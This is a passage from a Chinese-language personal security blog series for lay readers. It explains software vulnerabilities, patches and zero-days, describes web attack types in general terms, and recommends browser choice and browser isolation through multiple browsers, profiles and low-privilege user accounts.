次散列（N 可以是几千或几万）。这样一来，别人拿到你的某个密码后，更加难逆向分析出你的“种子串”。因此也就无法分析出由种子串构造出来的其它密码。 ★结尾 今天又花了不少篇幅，总算把俺平生积累的，关于如何构造复杂密码的经验，都讲完了。如果哪个网友还有其它独到的经验，希望来信和俺分享。如果俺觉得实用，也会补充到本文中。 本系列的下一个帖子，会说说安全漏洞的基本防范。 如何防止黑客入侵[4]：安全漏洞的基本防范文章目录 ★扫盲基本概念★安全漏洞的分类★漏洞的防范措施 前面用2个帖子来介绍口令方面的安全（在“这里”和“这里”）。今天扫盲一下跟安全漏洞相关的知识，为下一篇（Web 相关的防范）做好铺垫。考虑到俺博客的读者群，本文主要拿Windows桌面系统来举例，并且尽量说得浅显一点。 ★扫盲基本概念◇什么是漏洞？ 所谓的“漏洞”，简单来说，就是会引起各种问题的软硬件缺陷（软件业的行话叫 Bug）。要知道，任何东西都不可能是完美的，软硬件系统也不例外（毕竟开发软硬件系统的程序员/工程师，也是凡人，也会有出错的时候）。 ◇什么是安全漏洞？ 在上述提到的缺陷中，那些会被攻击者加以利用的，并因此导致安全问题的缺陷，就是所谓的“安全漏洞”。 ◇什么是补丁？ 补丁是一个很形象的说法。如果你衣服破了个洞，只要打个补丁，不需要把整件衣服换掉。同样的，如果你的某个软件有漏洞，也只要打一个补丁，不需要重新安装新版本的软件。大多数情况下，补丁和漏洞是配套的。 ◇什么是攻击代码 / 攻击程序？ 为了利用某个安全漏洞，黑客需要运行某个程序，这个程序就叫做攻击程序（也叫“攻击代码”）。通俗地说，攻击程序和补丁之间的关系，就好比矛和盾之间的关系。 ★安全漏洞的分类 除了上述的基本概念，你还需要大致知道安全漏洞的分类方式。 ◇按照所在软件的类型分类 根据出现漏洞的软件的类型，可以把漏洞分为“操作系统漏洞”、“应用软件漏洞”、“Web 漏洞”等。 所谓的“操作系统漏洞”，就是操作系统本身有的安全缺陷。 所谓的“应用软件漏洞”，就是你安装的软件所内含的安全缺陷。 近几年来，基于 Web 的攻击日益增多，所以把 Web 漏洞单独分一类。所谓的“Web 漏洞”，也就是跟Web相关的漏洞——包括了浏览器本身的漏洞和网站的漏洞（本系列的下一篇会具体介绍这方面的知识）。 ◇按照危险级别分类 还可以根据漏洞的危险程度，进行分类。通常按照“高中低”分三级（也有把危险级别定为5级的）。级别越高，就越危险。 对于高危的漏洞，有可能导致攻击者在你的电脑上植入木马。 ◇按照攻击代码的位置分类 针对攻击代码所处的位置，可以把漏洞分为“远程漏洞”、“本地漏洞”两类。 所谓的“远程漏洞”，就是说，攻击者只需要在另外一台机器运行攻击代码，就可以让你的电脑中招。 所谓的“本地漏洞”，就是攻击者的攻击代码必须在你的机器上执行。 ◇按照补丁的情况分类 刚才已经解释过了“补丁”和“漏洞”之间的关系。 对于大部分漏洞而言，都有对应的补丁；但是少数漏洞没有补丁。没有补丁的漏洞是很危险的。为啥会出现这种情况捏？俺稍微解释一下。 1. 未公开的漏洞 有些黑客发现某个漏洞后，没有在圈内公开，也没有告知对应的软件厂商。那么这种漏洞就变成“未公开的漏洞”。因为没有公开，软件厂商不知情，自然也就没有发布补丁。 这种漏洞【最危险】，有可能长期被攻击者用来入侵。据俺所知，有些高危漏洞已经在黑客圈内流传多年，而相应的软件厂商依然不知情。 2. 零日漏洞（Zero-Day） 如今互联网很发达，某些资深且勤奋的攻击者可以对漏洞的发布作出快速反应。一旦某个漏洞的细节被公开，他们可以在24小时之内制作出相应的攻击代码。而这个时候，软件厂商多半还没来得及发布补丁。那么这些攻击者就可以利用这个时间差，进行入侵活动。所以，安全圈内也把这种漏洞称为“零日漏洞”（洋文叫：Zero-Day 或 0-Day）。相对于“未公开漏洞”，“零日漏洞”可利用的时间段会短一些。比较负责任的软件厂商通常会在一周或一月之内发布补丁。不过捏，也有些不靠谱的公司（包括大公司），要拖上好几个月才发布漏洞补丁（比如 Oracle）。 ★漏洞的防范措施 针对漏洞的这几种不同分类，俺分别介绍一下几种基本的、常见的防范方式。 ◇个人防火墙 个人防火墙主要用于防范“远程漏洞”，对于“本地漏洞”，防火墙基本帮不上忙。 因为大多数远程漏洞，都存在于你机器对外开启的监听端口中。个人防火墙可以阻止这些端口对外开放，从而避免潜在的漏洞被攻击者利用。 自从 Windows 2000 开始，微软就在操作系统中内置了防火墙功能。对于 Windows XP 以及之后的版本，可以直接到控制面板中开启它。 如果你的电脑只是用来上上网、聊聊天、看看电影、用用办公软件，那你完全可以把防火墙设置成——不开放任何对外的端口。这样一来，即便你的电脑中存在远程漏洞，也不易被攻击者利用。 ◇定期升级系统补丁 Windows 系统的漏洞一直比较多——毕竟用户群太大，容易被黑客盯上。所以从很多年以前，微软就开始定期提供 Windows 补丁。具体的做法是每月的第二个星期二，发布新发现的漏洞的补丁。另外，如何发现高危的漏洞，也会临时发布紧急补丁。 从 Windows 2000 开始，系统就支持自动的补丁升级机制。你只要在“控制面板”里打开“自动更新”这个功能，然后选择“自动”方式。你一定要确保系统的”自动更新”机制处于启用状态。这就可以堵住很多操作系统漏洞，从而降低攻击的风险。 提醒一下：自动更新不是 Windows 独有滴。其它一些用户群比较大的桌面系统（比如：Mac OS，Ubuntu）也提供了自动更新安全补丁的功能。 ◇启用软件的自动更新 有一些做得比较好的软件，会内置自动更新功能（比如：Firefox、Chrome …），一旦其官方网站有新的版本或补丁，就会自动下载并更新。如果你担心这类软件有安全问题，可以启用它们的自动更新功能。 ◇使用小众且活跃的软件 俗话说树大招风。越知名的软件，就越容易引来黑客的注意，被发现安全漏洞的概率也会增大。 比如说：IE 的用户群最大，针对 IE 漏洞的挂马攻击是各种浏览器中最普遍的；Firefox 相对就少很多；而 Chrome 和 Safari 就更少了（不过捏，随着 Firefox 和 Chrome 的流行，针对这两款浏览器的攻击也多起来了）。 再比如说：同样是 PDF 阅读器，Adobe Reader 被曝光的漏洞就比较多，相对而言，Foxit Reader 和 PDF-XChange Viewer 就没这么多问题。 为啥俺还要强调【活跃】捏？小众软件根据活跃程度可以分为：活跃 or 不活跃。不活跃的软件，通常说明：开发者维护该软件不够积极，也就意味着该软件在【漏洞修复】方面不够迅速/及时——这就会导致安全风险；反之，活跃的软件，就没这个问题。 关于安全漏洞的基本防范，今天就聊到这里。考虑到近年来，针对 Web 攻击的情况剧增，本系列后续的帖子会说一下 Web 相关的话题。 如何防止黑客入侵[5]：Web相关的防范（上）文章目录 ★Web安全的重要性★Web 相关的攻击手法★如何选择浏览器？★如何选择插件和扩展？ 由于俺比较懒，导致本系列已经中断了2年之久。上星期有读者留言，希望俺尽快把本系列补上。再加上昨天看到新闻，说 Java 7 爆出全系列的高危漏洞。凡此种种，促使俺补上了本系列的第5篇，关于 Web 的防范。这部分的内容比较长，为了避免大伙儿阅读疲劳，俺把《Web相关的防范》分为上中下3个部分。 ★Web安全的重要性 在聊正题之前，先给大伙儿强调一下“Web 安全”的重要性。 如今互联网非常普及，大部分的家用电脑和商业电脑，都具备联网功能。而且大部分电脑只要一开机，就处于联网状态。作为电脑的使用者，有相当一部分时间是花在 Web 浏览（俗称网上冲浪）。在这样的环境中，Web 就成了恶意软件（病毒、木马、蠕虫、勒索软件……）最理想的一种传播媒介。据说如今大部分电脑中招，都与 Web 有关。 正因为如此，才把 Web 相关的内容，单独汇总一篇。接下来，俺先介绍一下攻击者常见的招数，然后再介绍一下各种应对措施。 ★Web 相关的攻击手法◇嗅探（sniffer） 所谓的“嗅探”，就是攻击者利用某些技术手段，截获你的网络数据流并进行分析，从而获取某些有价值的信息。通常来说，“嗅探”只是入侵的初始阶段（准备阶段）。攻击者通过“嗅探”获取到的信息，通常用来进行辅助后续的入侵行动。 举例： 很多人喜欢通过公共场所的 WiFi 热点上网。假如你使用的 WiFi 热点没有设置为强加密。那么，某个攻击者就有可能利用 WiFi 嗅探工具，截获你的上网流量。如果你正好在收发 Web 邮件，而且没有通过 HTTPS 加密（好多国内的 Web 邮箱【不】支持全程 HTTPS 加密）。那么，攻击者就可以看到你的收发的邮件内容。 ◇钓鱼（phishing） “钓鱼攻击”包括很多种，基于 Web 的网络钓鱼是其中之一。 由于“钓鱼攻击”属于社会工程学的范畴，也不是本文的重点。今后有空的话，单独写一篇“关于钓鱼攻击的防范”。 ◇利用浏览器自身的安全漏洞 在前文里，俺已经扫盲了”漏洞”、”补丁”等概念以及相关的一些常识。健忘的同学，可以再去温习一下。 在软件行业中，几乎每一款软件都会有漏洞——浏览器自然也不例外。浏览器的漏洞有很多种，其中一类叫做”安全漏洞”。顾名思义，就是会导致安全问题的漏洞。 如果某款浏览器的安全漏洞被攻击者发现，而浏览器厂商自己还不知晓。那么攻击者就可以利用该漏洞，发起广泛的攻击。 举例： 假设某个黑客研究 IE 的内核，首先发现 IE 存在一个“渲染图片导致缓冲区溢出”的漏洞。由于该漏洞是独家发现，只要该黑客不公开漏洞的信息，连微软（也就是 IE 浏览器的厂商）也会蒙在鼓里。因此，也就【没有】针对该漏洞的补丁。那么，这个黑客会如何利用该漏洞捏？\\1. 首先挑选一张图片（为了吸引人，通常会选一张美女图之类的照片），然后精心地嵌入一段攻击代码在图片内部。\\2. 把这张图片放到网上（比如张贴到某个大型论坛，再配上一个吸引人的标题）。\\3. 过不了多久，就会吸引到很多网友来围观。如果围观的网友用的浏览器不是 IE，那么他仅仅是看到一张美女图而已，不会有啥异样。如果围观的网友用的正好是有漏洞的 IE 版本，当 IE 打开那张图片的瞬间，攻击代码就会被激活（被运行）。然后，攻击代码会悄悄地在这台电脑中安装一个木马（技术行话叫“植入木马”）。之后，这台电脑就成为攻击者的肉鸡了（攻击者可以远程控制肉鸡，为所欲为）。\\4. 攻击者控制了肉鸡之后，既可以拿去卖钱（有专门的地下肉鸡交易市场），也可以偷窥机主的隐私（看看有没有网银、裸照、QQ 靓号）。如果控制的肉鸡数量巨大，还可以搞 DDOS 攻击…… ◇利用浏览器【插件或扩展】的安全漏洞 如今大部分浏览器上，都安装了插件。最常见的插件就是 Flash 插件。另外还有“PDF 插件、Java 插件”等等。 浏览器的插件也属于软件，也会存在安全漏洞，因此也可以被攻击者利用。一般来说，攻击者对插件漏洞的利用，类似于对浏览器漏洞的利用。 举例1： 2011年，美国大名鼎鼎的安全公司 RSA 遭到入侵并且被深度渗透，连看家产品 SecureID 的密钥也被偷了。 攻击者之所以能得手，就是利用了 Flash 插件的一个零日漏洞。洋文好的同学，可以看“这里”的详细报道。 举例2： 同样是在去年，有不少 Gmail 用户遭到入侵。但实际上，Gmail 本身并没有出问题。攻击者是利用 Flash 的漏洞，伪造跨站请求，然后在 Gmail 的转发列表中加入一个攻击者的邮箱。之后，被害人收到的所有邮件，都会自动转发给攻击者。 从最近几年的趋势来看，插件漏洞导致的安全问题，要多于浏览器漏洞导致的安全问题。 ◇跨站脚本攻击（XSS） 最后再来说说”跨站脚本”的问题。 大部分 XSS 攻击，都是利用网站本身的漏洞。所谓的网站，其实就是若干 Web 服务器，上面运行若干软件。前面说了，只要是软件，就可能存在漏洞（包括安全漏洞）。所以，Web 服务器上的软件自然也不例外。 基于 XSS 的攻击有很多种类型，具体的技术原理也有所差异。考虑到大部分读者不是搞技术的，俺就不深入展开了。仅举一例，让大伙儿有个感性的认识。 举例： 比如某个 BBS 论坛存在漏洞——【没有】对用户发布的帖子内容（此处的“内容”，不是指文字的内容，而是指特殊字符）进行严格的检查。如果某个攻击者发现了此漏洞，就可以精心构造一个帖子，在帖子的正文中包含一段攻击脚本（通常是 JavaScript）。接下来，攻击者把这个帖子发布到该论坛上。 然后捏，如果有人浏览了这篇帖子，这段攻击脚本就会被激活，然后干坏事…… ★如何选择浏览器？ 对于用户来说，浏览器是 Web 的根基。所以，谈 Web 的安全防范，首先得聊一聊如何选择浏览器。 挑选浏览器有如下几个指标供参考：1. 浏览器的质量好不好评判安全方面的质量，最关键的一条是：看浏览器有没有经常出安全漏洞。2. 浏览器的更新快不快爆出漏洞后，浏览器的开发团队是否及时出补丁或新版本。3. 浏览器的功能强不强除了要看浏览器本身的功能，还要看其支持的扩展是否丰富。 根据上述指标，俺把市面上常见的浏览器，根据靠谱的程度，划分为如下三类： ◇第一类：Firefox 和 Chrome（含 Chromium） 俺个人强烈建议用 Firefox 或 Chrome 进行网上冲浪，因为这两款浏览器很符合上述指标。质量好本世纪初，浏览器市场被 IE 一统天下。但随着时间推移，IE 在全球的市场份额逐步被 Chrome ＆ Firefox 占去一半以上。这充分说明 Firefox 和 Chrome 的质量很好。另外，在安全漏洞方面，Firefox 和 Chrome 也优于 IE。更新快说到快速更新（快速迭代），这是 Chrome 的首创。从去年开始，Firefox 也学 Chrome 采用快速版本更新。功能强说到功能，Firefox 刚出道时，利用丰富的扩展吸引了足够多的用户。如今，无论是扩展的种类还是扩展的下载量，Firefox 是最多的；至于 Chrome，由于出道时间晚，这扩展方面不如 Firefox，但显然比 IE 强多了。 除了上述这几条，这两款浏览器还具有如下优点：支持的平台很多支持三大主流的桌面系统（Windows、Mac OS、Linux），支持两大主流的移动系统（Android、iOS）。开源项目由于开源而且参与的程序员也多，所以软件中的漏洞容易被及早发现。（Chromium 是开源滴；Chrome 虽然基于 Chromium，但包含【闭源】模块） 以上就是俺推荐 Firefox 和 Chrome 的理由。在本文的后续章节，俺会以这两款浏览器为主，进行介绍。 ◇第二类：IE、Safari、Opera 先说 Safari 和 Opera。这两款的出道时间早于 Firefox 和 Chrome。忙活了这么多年，如今的市场份额依然很低，这已经说明某些问题。另外，俺个人觉得 Safari 和 Opera 的扩展和插件不够丰富，更新速度也不够快，所以俺不推荐。 至于 IE，曾经是市场份额最大的浏览器，而是集成（捆绑）在 Windows 系统中。为啥俺把它放到第二类捏？有如下几个原因：\\1. IE 跟 Windows 集成得太紧密。IE 如果爆漏洞，通常要等微软发布 Windows 补丁来修复。而 Windows 补丁是按月发布的——太不及时啦。\\2. 相比 Firefox 和 Chrome，IE 是闭源项目。由于源代码不公开，而且参与的人不够多，导致潜在的漏洞难以被发现。\\3. IE 用户大都是菜鸟用户（很多菜鸟只知道用系统内置的浏览器）。由于菜鸟不太懂安全防范，有些【低级】骇客就喜欢盯着这个用户群。 说到这儿，可能有同学会问：天朝的好多网银都只能用 IE（很多网银客户端依赖于 IE 的 ActiveX 控件），咋办捏？别担心，在本系列的下一篇《Web相关的防范 (下)》会谈到此问题的解决方法。 ◇第三类：五花八门的【国产】浏览器 说到【国产】的浏览器，有必要谈一下浏览器的内核（也就是浏览器的引擎）。绝大部分国产的浏览器，都不是自己开发内核，而是基于老外现成的内核。常见的浏览器内核有三款，分别是：Gecko 内核（来自于 Mozilla 开源组织，主要供 Firefox 使用）Trident 内核（来自于微软，主要供 IE 使用）WebKit 内核（独立的开源项目，Chrome 和 Safari 使用此内核） 几款常见的国产浏览器（360浏览器、傲游浏览器、QQ 浏览器），使用的是 Webkit + Trident 的双内核模式。 某些国产浏览器把双内核作为吹嘘的亮点。但在安全层面，双内核反而会带来安全问题。假如你手头的国产浏览器采用了 Webkit + Trident 双内核。只要这两款内核中，有一个爆出安全漏洞，你就有可能中招。也就是说：双内核会增加你中招的概率。 俺极力反对【国产】浏览器，还有另一个原因——政治层面的安全问题。朝廷为了监控屁民在互联网上的一言一行，会跟国产浏览器厂商合作，通过浏览器记录网民的行踪。 举例： 前几年腾讯搞的“TT浏览器”，会把用户上网行踪记录在某个文件中。 至于 360，名声更是臭不可闻。360 浏览器本身就存在收集用户隐私的问题，居然还好意思自称是“安全浏览器”。而且大伙儿别忘了，奇虎公司跟 GFW 一直保持着暧昧的关系哦。 综上所述，俺个人【非常反对】使用国产浏览器。 ★如何选择插件和扩展？ 说完浏览器的选择，再来聊聊如何选择插件和扩展。 ◇插件和扩展的【区别】 先来扫盲一下插件和扩展的区别（连很多 IT 技术人员都把这两者混为一谈）。所谓的插件，洋文叫“plugin”；所谓的扩展，洋文叫“extension”。两者的区别如下： 插件 在功能上，插件通常是用来渲染 HTML 页面中的 &lt;object&gt; 或 &lt;embed&gt; 标签。 插件通常实现比较【底层】的功能，通常以平台相关的代码（本地代码）编写，可以调用操作系统的 API。形式上，插件以动态库（Windows 上就是 DLL 文件）的方式，加载到浏览器的进程内。由于使用本地代码编写，插件通常依赖于特定的操作系统（不同系统的插件不能混用）。 举例：Flash 插件媒体播放器插件PDF 插件Java 插件 扩展 扩展，顾名思义，是用来扩展浏览器自身的功能。所以，扩展可以调用浏览器自身的 API，但是大部分扩展【不能】调用操作系统的 API。 一般来说，扩展是跟操作系统无关的。比如 Firefox 的大部分扩展，既可以用于 Windows 平台的 Firefox，也可以用于 Linux 和 Mac 的 Firefox。 ◇插件和扩展在安全方面的差异 由于插件比较底层，一旦出现高危漏洞（比如能够执行本地代码的漏洞），攻击者就可以在操作系统中植入木马。可以这么说，插件出现漏洞，其危险性类似于浏览器出现漏洞。 相对而言，扩展出现漏洞，其危险性往往不如插件严重，通常也不会导致攻击者植入木马。 ◇尽量使用口碑好的扩展 虽然扩展出漏洞导致的危险性不如插件那么高，但也不能掉以轻心。 俺的经验是：尽量使用知名度高且评价好的扩展。这样的扩展通常成熟度也比较高——即使出了漏洞，更新也比较及时；这类扩展也会有更多安全研究人员对其进行研——即使有漏洞，也更容易被发现。 反之，对于某些很少人用的扩展，最好敬而远之。顺便提一下。某些层次低的入侵者，甚至会把木马伪装成浏览器扩展，再忽悠一个很花哨的功能，然后放到网上给大伙儿用。 ◇尽量避免使用【插件】 从上述对比可知，插件如果出现漏洞，危险性很高。所以，俺的建议是：尽量避免使用【插件】。 不过捏，避免使用插件，说起来简单，但是做起来有点难度。其它插件，说不用就不用了。但是 Flash 插件，实在是用得太广泛了（视频网站用到它，网页休闲小游戏也用到它），估计大伙儿难以割舍啊。 不幸的是，Flash 插件又最危险。一方面是因为 Adobe 的程序猿，安全意识太差；另一方面是因为 Flash 是用得最多的插件，成为攻击者的重点研究对象。根据2011年的统计数字，去年一年，光是【高危漏洞】，Flash 就爆了4次——当之无愧地坐上漏洞排行榜的头把交椅。 面对 Flash 插件，该咋办捏？列位看官，请听下回分解。（下一篇会尽快发布） 如何防止黑客入侵[6]：Web相关的防范（中）文章目录 ★如何防范浏览器和插件的漏洞？★“多浏览器”的方案★【多实例】的方案★【多用户】的方案 在本系列的前文聊了些基础性的东西，包括：常见的攻击手法、如何选择浏览器和插件。今天，俺继续介绍几个相对高级一点的话题。 ★如何防范浏览器和插件的漏洞？ 在前一篇已经告诉大伙儿“如何选择浏览器”。但是光知道这个是不够滴！因为浏览器也是软件，只要是软件就可能会出现漏洞（包括安全漏洞）。 即使你按照俺的建议，选择 Firefox 或 Chrome 作为日常的浏览器，也【无法完全避免】浏览器自身出漏洞的问题。而且浏览器的漏洞中，有一些是没有补丁的高危漏洞（包括“未公开漏洞”＆“零日漏洞”，俺在前文里介绍过）。因为没有补丁，所以这类高危漏洞就特别危险。这就引出了第一个问题：如何防范浏览器的漏洞？ 另外，在浏览器插件中，Flash 插件既是最危险的插件，也是使用最广的插件。这就引出了第二个问题：如何安全地使用危险的插件？ 要解决上述2个问题，可以使用同一个原则，那就是：【对浏览器进行隔离】。具体的隔离方式有很多种，今天俺由浅入深，分别介绍一下。 ★“多浏览器”的方案◇操作步骤 这招是最简单的——就是在一台电脑上安装多款【不同内核】的浏览器。具体步骤俺就不多说了，节约点口水。 ◇优点1. 解决网银的问题 前面提到了国内网银依赖于 IE 的问题。但是 IE 的安全性又不如 Firefox 和 Chrome，咋办捏？最简单的办法就是同时安装两款浏览器（比如 IE + Firefox）。平时你上网的时候，用 Firefox，需要用网银，则改用 IE。 由于你仅仅在使用网银的时候，才开启 IE，大大降低了 IE 被入侵的机会。 2. 解决跨站脚本（XSS）的问题 使用多种浏览器，还可以帮你解决跨站脚本攻击的问题。 单纯的XSS攻击，主要是依赖 JavaScript。而 JavaScript 只能在浏览器进程内起作用，无法跨浏览器进程。所以，如果你同时使用 A B 两款浏览器。如果 A 浏览器发送 XSS 攻击，通常不会影响到 B 浏览器。除非这个 XSS 攻击结合了浏览器漏洞或插件漏洞。那么，多款浏览器是否能防范浏览器漏洞和插件漏洞捏？请看往下看。 3. 部分解决高危插件（Flash）的使用问题 俺在上一篇提到了利用 Flash 入侵 Gmail 的案例。 比方说，你同时用 Firefox 和 Chrome。其中 Firefox 安装 Flash，用来上普通的网站；而 Chrome 不装或禁用 Flash，专门用来上 Google 的相关服务器（比如 Gmail）。 某天，你收到一封恶意的邮件，该邮件会利用 Flash 的漏洞来入侵用户的电脑。幸运的是，你用来访问 Gmail 的 Chrome 上没有 Flash 插件（被禁用），于是攻击者的阴谋没有得逞 :-) ◇缺点1. 无法彻底解决浏览器漏洞和插件漏洞的问题 细心的读者会注意到，刚才那个小节的标题是部分解决高危插件（Flash）的问题。为啥俺要特地强调【部分解决】捏？因为浏览器的漏洞和插件的漏洞有很多种。有些漏洞只是让浏览器崩溃，无伤大雅；而有些漏洞可以导致在本地执行代码，并且能进一步植入木马。一旦你碰到后者，即使你采用“多种浏览器”的方式，也抵挡不住。 某些天真的网友可能会问：浏览器厂商和插件厂商不是会升级补丁吗？但是问题在于，有少数一些漏洞是没有补丁的。为啥会这样捏？请看本系列上一篇《安全漏洞的基本防范》，里面介绍了”未公开漏洞”和”零日漏洞”。 不过别担心，俺后面还会介绍更高级的招数，来防范这种情况。 2. 灵活性不够 对于“多浏览器”的方案，还有一个缺点是不够灵活。 因为你要为每一种用途安装一款浏览器，如果你的用途比较多（比如：上网银、普通浏览、Web 邮箱、看视频），就要装好几款。 另外，有些用户就喜欢某一款浏览器，你让这些用户装好几款浏览器，他们会觉得不爽。 对于“灵活性不够”的缺点，大伙儿可以参考接下来要介绍的第二招——“多实例”的方案。 ★【多实例】的方案◇什么是浏览器的多实例？ 所谓的浏览器多实例，有时候也称之为“Multiple Profiles”。 不论是 Firefox 还是 Chrome，默认安装的时候，只有一个实例（Profile）。和浏览器相关的各种信息，包括：插件、扩展、外观（皮肤）、页面缓存、cookie、等等，都存储在这个实例中。 反之，如果使用多实例，每个实例都具有独立的插件、独立的扩展、独立的外观（皮肤）、独立的页面缓存、独立的 cookie、等等。不同实例之间是相对隔离的，【不会】互相影响。 对于 Chrome，再特别提醒一下： Chrome 同时支持“Multiple Profiles”与“Multiple Accounts”。但别把这两者搞混了。即使你配置了多个 Accounts，依然在【同一个】实例里。 ◇操作步骤 多实例的配置，很多人不晓得。所以俺详细说一下。考虑到 Windows 用户居多，俺以 Windows 举例。Linux 和 Mac OS 的操作步骤大同小异。 多实例的 Firefox 对于 Windows 上的 Firefox，Profile 都放置于 %APPDATA%\\Mozilla\\Firefox\\Profiles 目录下。 假设你想创建一个【全新的】Firefox 实例，可以通过如下命令行来启动 Firefox。 1&quot;&#123;PATH&#125;\\firefox.exe&quot; -P &quot;XXXX&quot; -no-remote 上述命令中，&#123;PATH&#125; 表示你的 Firefox 的【安装目录】。XXXX 表示你要创建的【实例名】（实例名可以是任意字母组合，你也可以把 XXXX 改成其它名称）。 运行完上述命令，Firefox 会启动出一个名叫 XXXX 的实例。与此同时，在 %APPDATA%\\Mozilla\\Firefox\\Profiles 下会多出一个名叫 XXXX 的目录。 按照上述方式依样画葫芦，你就可以启动出任意多个 Firefox 实例。为了省事，你可以把上述命令行做成一个快捷方式，放到桌面上，免得每次都敲键盘。 另外，Firefox 还提供了一个多实例的管理界面，用如下命令可以调出该界面。 1&quot;&#123;PATH&#125;\\firefox.exe&quot; -p 多实例的 Chrome Chrome 类似于 Firefox，也可以通过命令行启动新的实例。 对于 Windows 上的 Chrome，由于 Chrome 安装的时候没让选安装目录，所以其【exe 的安装目录固定如下】： Windows 7 或 Vista 系统C:\\Users\\**&#123;USER&#125;**\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exeWindows XP 系统C:\\Documents and Settings\\**&#123;USER&#125;**\\Local Settings\\Application Data\\Google\\Chrome\\Application\\chrome.exe 上述的 &#123;USER&#125; 表示你的 Windows 用户名 找到 chrome.exe 之后，接下来，你需要创建一个目录，用来存放新创建的实例。比方说，你用的是这个目录： X:\\XXXX\\ 然后，通过如下命令启动 Chrome，就可以创建出新实例 Vista 或 Windows 7 系统 1C:\\Users\\&#123;USER&#125;\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe --user-data-dir=&quot;X:\\XXXX\\&quot; Windows XP 或 Win 2003 系统 1C:\\Documents and Settings\\&#123;USER&#125;\\Local Settings\\Application Data\\Google\\Chrome\\chrome.exe --user-data-dir=&quot;X:\\XXXX\\&quot; 按照上述方式依样画葫芦，你就可以创建出任意多个 Chrome 实例。为了省事，你可以把上述命令行做成一个快捷方式，放到桌面上，免得每次都敲键盘。 ◇优点1. 解决跨站脚本（XSS）的问题 这个优点跟“多浏览器”方案是类似的。俺就不再啰嗦了。 2. 部分解决高危插件（Flash）的使用问题 这个优点跟“多浏览器”方案是类似的。俺就不再啰嗦了。 3. 灵活性高 与“多浏览器”的方案相比，“多实例”的方案明显灵活多了。因为 Firefox 和 Chrome 可以创建出任意多个实例（只要你的硬盘够大，想建几个实例都行）。而且，这个方案可以满足某些 Firefox 粉丝或 Chrome 粉丝的个人偏好。 ◇缺点1. 无法彻底解决浏览器漏洞的问题 在这方面，“多实例方案”与“多浏览器方案”具有共同的缺陷——无法抵御具有【本地代码执行】的高危漏洞。包括浏览器漏洞和插件漏洞都有可能出现这类高危漏洞。 那么，该咋办捏，请看下一节——“多用户”的方案。 ★【多用户】的方案 前面提到的两种方案，都无法防范某些浏览器或插件的高危漏洞。因为这些高危漏洞会导致在本地执行攻击代码，并有可能植入木马。现在，俺来介绍第三种方案——多用户方案。此方案可以防范大部分在本地执行的攻击代码。 先说明一下，此处的“用户”指的是【操作系统用户】。 ◇某些高危漏洞为啥很危险？ 俺前面反复提到“导致本地执行攻击代码的漏洞”。这样的漏洞是非常非常危险的。为啥捏？俺简单扫盲一下。 如果你的浏览器或者浏览器插件具有这类漏洞，当你访问某个恶意网页时，如果该恶意网页能够利用此漏洞，就可以在你的本地的操作系统中执行攻击代码。由于这个攻击代码是在浏览器的进程内触发的，所以该攻击代码就具有当前用户所具有的权限。 比方说，如今大部分网友都用 Windows 上网。并且，这些网友都是以“系统管理员”的身份使用浏览器。一旦碰到这类漏洞时，本地的攻击代码也同时具有了“系统管理员权限”。有了这么高的权限，攻击代码可以为所欲为。 某些网友可能会问：那不用管理员身份上网，是不是就没事了？ 俺只能说，用低权限的用户身份（比如 Windows 里面的“Users 组”）上网，相对于用管理员身份上网，会好一些。但是捏，还是有问题。 举个例子： 即使你用低权限用户上网，一旦遭遇这类漏洞，攻击代码还是有可能植入木马。然后捏，这个木马有可能会查找你电脑上的各种私密文件（比如你的裸照）。然后木马会把这些私密文件发送给木马的主人。 从上述例子可见，用低权限的用户上网，【不能】彻底解决问题。所以，俺隆重推出第三种方案——多用户方案。 ◇啥是“多用户方案”捏？ 如今的桌面操作系统，无论是 Windows 还是 Linux 或 Mac OS，都可以创建多个操作系统用户，并且这多个用户可以同时运行程序。如果你用过 WinXP 的快速用户切换，应该对此深有体会。 多用户方案的关键在于： 你需要创建一个或多个【低权限】的“上网用户”（所谓低权限，必须低于你当前使用的用户权限）。这些“上网用户”专门用来访问各种网站。 假使你不幸访问了恶意网页，遭遇本地执行的攻击代码，问题也不大。因为这些上网用户的权限很低，所以它们触发的攻击代码，权限也很低。因此攻击代码就比较难钻空子。一般来说，对“上网用户”的权限限制得越严格，攻击代码就越难有作为。 ◇操作步骤1. 创建上网用户 如何在桌面系统中创建新的用户，大家应该都会吧？不会的同学，请看《避免使用高权限用户》一文的相关章节。上网用户可以只创建一个，也可以创建多个。具体建几个，看你的需求。 举例： 假如你非常看重网银的安全，可以创建两个上网用户，一个专门用来访问网银，一个专门用来上其它网站。 提醒一下：在这些上网用户的环境中，除了浏览器，其它啥软件都【别】装。 2. 设置上网用户的权限 再啰嗦一次，上网用户的权限，一定要低于你目前使用的用户权限。 以 Windows 为例：在 Windows 中，常见的用户组的权限大小分别是：“Administrators 组” ＞ “Power Users 组” ＞ “Users 组” ＞ “Guest 组”。如果你平时用“Administrators 组”的用户，那么可以把上网用户设置为：“Power User”或“User”或“Guest”如果你平时用“Power Users 组”的用户，那么上网用户就只能设置为 User 或 Guest。以此类推……（如果你想了解这些用户组之间的权限差异，可以参考本系列的第一个帖子《避免使用高权限用户》） 提醒一下： Guest 用户组的权限是最低，低得难以想象。所以，从安全角度而言，把上网用户设置为“Guest 组”是最安全滴。但是，也是最麻烦滴。你需要进行好多设置——否则的话，你可能连浏览器都跑不起来。 所以，除非你对 Windows 系统比较熟悉，否则的话，俺【不】建议使用“Guest 组”的权限。比较理想的权限是“Users 组”。这个组的权限也比较低，但是用起来不麻烦。 3. 设置文件目录的访问控制权限（ACL） 每个人的电脑中，都会有某几个目录是用来存放你的敏感个人资料的。 你必须设置这些目录的访问控制权限（简称 ACL），设置为：“上网用户”所在的组【不允许读写】。这样一来，你可以把自己那些敏感的，私密的文件（比如自己的裸照），都通过上述 ACL 保护起来。即使“上网用户”遭遇高危漏洞的攻击，本地执行的攻击代码也【难以拿到】你的隐私（俺说”难以拿到”，意思就是说，还是有可能滴，但是可能性很小，后面会解释）。 顺便提醒一下：对于 Windows 系统，只有使用 NTFS 格式的分区，才支持 ACL。FAT32 格式的分区是不支持滴！ 如果你是个菜鸟，不懂得如何设置文件及目录的 ACL，没关系！Google 一下，你就知道。 4. 多用户浏览器共享同一个桌面的技巧 你可以直接用 Windows 提供的“快速用户切换”。对于 Windows 系统，从 WinXP 开始就提供了”快速用户切换”的功能。用它来切换用户还是很方便滴。但是这招有一个缺点：你一次只能看到某一个用户运行的软件，其它用户运行的软件看不到。 不过没关系，还有一个小技巧，可以让你在同一个桌面中，运行不同用户的软件（包括浏览器）。 假设你创建了 A ＆ B 